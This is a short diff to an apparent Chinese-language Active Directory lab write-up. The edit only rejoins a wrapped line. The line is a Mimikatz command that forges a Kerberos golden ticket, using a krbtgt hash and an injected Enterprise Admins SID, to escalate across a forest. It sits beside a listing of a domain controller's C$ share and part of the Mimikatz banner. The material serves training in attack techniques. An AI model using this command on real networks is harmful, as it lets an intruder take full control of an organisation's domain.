@@ -102,8 +102,7 @@ ls \\mcorp-dc.moneycorp.local\c$
 由于之前我们已经拿到了krbtgt的hash值，这里直接使用
 ```
 PS C:\ad> . .\Invoke-Mimikatz.ps1
-PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da267
-96f35 /ticket:C:\AD\krbtgt_tkt.kirbi"'
+PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi"'
 
   .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
